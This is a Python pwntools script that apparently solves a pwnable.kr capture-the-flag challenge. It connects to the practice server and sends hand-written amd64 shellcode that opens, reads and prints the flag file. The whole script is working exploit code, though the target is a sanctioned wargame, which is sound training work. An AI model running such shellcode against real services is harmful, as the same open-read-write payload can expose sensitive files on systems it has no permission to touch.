import pwn
import socket

IP = 'pwnable.kr'
PORT = 9026

def main():
	
	pwn.context (arch = 'amd64', os = 'linux')
	s = socket.socket()
	s.connect ((IP,PORT))
	data = s.recv (4096)
	print (data)

	shellcode = pwn.asm ("""
		xor rax, rax				
		xor rbx, rbx
		xor rdx, rdx
		xor rcx, rcx
		xor rdi, rdi
		xor rsi, rsi
		jmp short load_file_name 
		starter:
			mov al, 2
			pop rdi
			xor rsi, rsi
			syscall
			mov rdi, rax
			xor rax, rax
			mov al, 0
			sub rsp, 150
			mov rsi, rsp
			mov rdx, 100
			syscall
			mov rcx, rax
			xor rax, rax
			mov al, 1
			xor rdi, rdi
			mov rdi, 1
			mov rdx, rcx
			syscall
			xor rax, rax
			mov al, 0x3c
			xor rdi, rdi
			syscall
		load_file_name:
    		call starter
    		.ascii "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
    		.byte 0
		""")

	s.send (shellcode)
	data = s.recv (4096)
	print (data)
	data = s.recv (4096)
	print (data)

if __name__ == '__main__':
	main()